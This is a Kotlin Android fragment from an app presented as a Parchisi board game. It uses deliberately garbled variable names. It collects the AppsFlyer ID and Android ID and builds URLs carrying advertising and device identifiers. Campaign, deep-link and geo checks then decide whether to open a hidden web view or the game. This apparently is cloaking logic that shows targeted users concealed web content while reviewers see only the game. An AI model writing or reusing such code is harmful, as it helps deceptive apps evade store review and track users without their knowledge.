package com.superking.parchisi.stard

import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.os.Build
import android.os.Bundle
import android.util.Log
import androidx.fragment.app.Fragment
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import com.appsflyer.AppsFlyerLib
import com.superking.parchisi.stard.conna.Util.ad_id
import com.superking.parchisi.stard.conna.Util.gjitgjgti
import com.superking.parchisi.stard.conna.Util.aps_id
import com.superking.parchisi.stard.conna.Util.codeCode
import com.superking.parchisi.stard.conna.Util.geoCo
import com.superking.parchisi.stard.conna.Util.instId
import com.superking.parchisi.stard.conna.Util.keyVAl
import com.superking.parchisi.stard.conna.Util.gtgtjgtijgt
import com.superking.parchisi.stard.conna.Util.gtntggt
import com.superking.parchisi.stard.conna.Util.nammgttg
import com.superking.parchisi.stard.conna.Util.one
import com.superking.parchisi.stard.conna.Util.hyhyy5h5
import com.superking.parchisi.stard.conna.Util.subFivegt
import com.superking.parchisi.stard.conna.Util.subFourgttg
import com.superking.parchisi.stard.conna.Util.subOne
import com.superking.parchisi.stard.conna.Util.subSixgttg
import com.superking.parchisi.stard.conna.Util.vfbfygrfrfy
import com.superking.parchisi.stard.conna.Util.gtigtihgt
import com.superking.parchisi.stard.gaamamam.GaaammmmuActivity2
import com.superking.parchisi.stard.vevvvivev.ViviviivvActivity2
import org.koin.android.ext.android.inject
import org.koin.core.qualifier.named


class FillloFragment : Fragment() {
    private lateinit var gtgthyhyhy: Context
    val shareP: SharedPreferences by inject(named("SharedPreferences"))

    override fun onAttach(context: Context) {
        super.onAttach(context)
        gtgthyhyhy = context
    }

    override fun onCreateView(
        inflater: LayoutInflater, container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View? {
        return inflater.inflate(R.layout.fragment_filllo, container, false)
    }

    override fun onViewCreated(view: View, savedInstanceState: Bundle?) {
        super.onViewCreated(view, savedInstanceState)
        val hyhyujikkiik = shareP.getString(geoCo, null)
        val frgthybvvvffv = shareP.getString("appCamp", null)
        val vgthyhyhy = shareP.getString("deepSt", null)
        val gtgkpgtgtj = shareP.getString(codeCode, null)
        val gtgtjtgjigt = shareP.getString(gjitgjgti, null)
        val wvgttggt = shareP.getString(gtigtihgt, null)
        val mainId = shareP.getString("mainId", null)
        val pack = hyhyy5h5
        val gigthugt = Build.VERSION.RELEASE
        val vfbvedfedfed = shareP.getString(gtntggt, null)
        val frnrfrfrf: String? = shareP.getString(instId, null)

        val gtgthigduegfde = Intent(activity, ViviviivvActivity2::class.java)
        val rfbrfbbrf = Intent(activity, GaaammmmuActivity2::class.java)

        val cdvdcvgcdvg = AppsFlyerLib.getInstance().getAppsFlyerUID(gtgthyhyhy)
        AppsFlyerLib.getInstance().setCollectAndroidID(true)

        shareP.edit().putString(aps_id, cdvdcvgcdvg).apply()

        val frgfrgfr =
            "$wvgttggt$subOne$frgthybvvvffv&$one$cdvdcvgcdvg&$ad_id$mainId&$subFourgttg$pack&$subFivegt$gigthugt&$subSixgttg$nammgttg"
        val fryugrfgrfy = "$wvgttggt$one$vfbvedfedfed&$ad_id$frnrfrfrf&$subFourgttg$pack&$subFivegt$gigthugt&$subSixgttg$nammgttg"
        val hgtgthugt =
            "$wvgttggt$subOne$vgthyhyhy&$one$cdvdcvgcdvg&$ad_id$mainId&$subFourgttg$pack&$subFivegt$gigthugt&$subSixgttg$vfbfygrfrfy"
        val rfhhrfhrfrhf =
            "$wvgttggt$subOne$vgthyhyhy&$one$vfbvedfedfed&$ad_id$frnrfrfrf&$subFourgttg$pack&$subFivegt$gigthugt&$subSixgttg$vfbfygrfrfy"


        when (gtgtjtgjigt) {
            "1" ->
                if (frgthybvvvffv!!.contains(keyVAl)) {
                    shareP.edit().putString(gtgtjgtijgt, frgfrgfr).apply()
                    shareP.edit().putString("WebInt", "campaign").apply()
                    startActivity(gtgthigduegfde)
                    activity?.finish()
                } else if (vgthyhyhy != null || gtgkpgtgtj!!.contains(hyhyujikkiik.toString())) {
                    shareP.edit().putString(gtgtjgtijgt, hgtgthugt).apply()
                    shareP.edit().putString("WebInt", "deepLink").apply()
                    startActivity(gtgthigduegfde)
                    activity?.finish()
                } else {
                    startActivity(rfbrfbbrf)
                    activity?.finish()
                }
            "0" ->
                if (vgthyhyhy != null) {
                    shareP.edit().putString(gtgtjgtijgt, rfhhrfhrfrhf).apply()
                    shareP.edit().putString("WebInt", "deepLinkNOApps").apply()
                    startActivity(gtgthigduegfde)
                    activity?.finish()
                } else if (gtgkpgtgtj!!.contains(hyhyujikkiik.toString())) {
                    shareP.edit().putString(gtgtjgtijgt, fryugrfgrfy).apply()
                    shareP.edit().putString("WebInt", "geo").apply()
                    startActivity(gtgthigduegfde)
                    activity?.finish()
                } else {
                    startActivity(rfbrfbbrf)
                    activity?.finish()
                }
        }
    }
}
